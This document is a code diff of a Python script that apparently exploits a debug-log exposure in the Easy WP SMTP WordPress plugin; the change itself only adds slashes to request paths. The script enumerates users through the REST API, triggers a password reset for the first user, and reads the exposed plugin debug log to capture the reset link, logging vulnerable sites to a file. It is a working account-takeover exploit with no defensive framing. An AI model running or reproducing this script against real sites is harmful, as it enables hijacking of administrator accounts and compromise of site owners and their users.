@@ -13,26 +13,26 @@ headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gec
 
 def reset_password(url, debug_name, username):
     print('reset_password() Caleed. - {}'.format(url))
-    r = requests.get(f'{url}wp-login.php?action=lostpassword', verify=False, timeout=10, allow_redirects=False, headers=headers)
+    r = requests.get(f'{url}/wp-login.php?action=lostpassword', verify=False, timeout=10, allow_redirects=False, headers=headers)
     print('FIRST REQuEST : {} - {}'.format(r.status_code, url))
     if r.status_code == 200:
         data = {'user_login': username, 'redirect_to': '', 'wp-submit': 'Get+New+Password'}
-        r = requests.post(f'{url}wp-login.php?action=lostpassword', verify=False, timeout=10, allow_redirects=False, headers=headers, data=data)
+        r = requests.post(f'{url}/wp-login.php?action=lostpassword', verify=False, timeout=10, allow_redirects=False, headers=headers, data=data)
         time.sleep(0.5)
-        r = requests.get(f'{url}wp-content/plugins/easy-wp-smtp/{debug_name}', verify=False, timeout=10, allow_redirects=False, headers=headers)
+        r = requests.get(f'{url}/wp-content/plugins/easy-wp-smtp/{debug_name}', verify=False, timeout=10, allow_redirects=False, headers=headers)
         if r.status_code == 200 and f'login={username}' in r.text:
             with open(f'vuln.txt', 'a+') as output:
                 output.write(f'EASY SMTP VULN : {r.url}\n')
 
 
 def getUser(url, debug_name):
-    r = requests.get(f'{url}wp-json/wp/v2/users', verify=False, timeout=10, allow_redirects=False, headers=headers)
+    r = requests.get(f'{url}/wp-json/wp/v2/users', verify=False, timeout=10, allow_redirects=False, headers=headers)
     if r.status_code == 200:
         if 'slug' in r.text:
             slug = r.json()[0]['slug']
             reset_password(url, debug_name, slug)
     if r.status_code != 200:
-        r = requests.get(f'{url}?rest_route=/wp/v2/users', verify=False, timeout=10, allow_redirects=False, headers=headers)
+        r = requests.get(f'{url}/?rest_route=/wp/v2/users', verify=False, timeout=10, allow_redirects=False, headers=headers)
         if r.status_code == 200:
             if 'slug' in r.text:
                 slug = r.json()[0]['slug']
@@ -40,16 +40,16 @@ def getUser(url, debug_name):
                 print(f'METHOD TWO: {slug}')
 
 def checksmtp(url):
-    r = requests.get(f'{url}wp-content/plugins/easy-wp-smtp/readme.txt', verify=False, timeout=10, allow_redirects=False, headers=headers)
+    r = requests.get(f'{url}/wp-content/plugins/easy-wp-smtp/readme.txt', verify=False, timeout=10, allow_redirects=False, headers=headers)
     if r.status_code == 200:
         if 'Easy WP SMTP' in r.text and '= 1.4.3 =' not in r.text:
-            r = requests.get(f'{url}wp-content/plugins/easy-wp-smtp/', verify=False, timeout=10, allow_redirects=False, headers=headers)
+            r = requests.get(f'{url}/wp-content/plugins/easy-wp-smtp/', verify=False, timeout=10, allow_redirects=False, headers=headers)
             if r.status_code == 200:
                 if 'Index of' in r.text and 'debug_log.txt' in r.text:
-                    r = requests.get(f'{url}wp-content/plugins/easy-wp-smtp/', verify=False, timeout=10, allow_redirects=False, headers=headers)
+                    r = requests.get(f'{url}/wp-content/plugins/easy-wp-smtp/', verify=False, timeout=10, allow_redirects=False, headers=headers)
                     find_debug = re.findall('<a href="(.*?)_debug_log.txt', r.text)[0].strip('/wp-content/plugins/easy-wp-smtp/')
                     if find_debug:
-                        r = requests.get(f'{url}wp-content/plugins/easy-wp-smtp/{find_debug}_debug_log.txt', verify=False, timeout=10, allow_redirects=False, headers=headers)
+                        r = requests.get(f'{url}/wp-content/plugins/easy-wp-smtp/{find_debug}_debug_log.txt', verify=False, timeout=10, allow_redirects=False, headers=headers)
                         if r.status_code == 200:
                             if 'SMTP Error:' not in r.text:
                                 debug_name = f'{find_debug}_debug_log.txt'
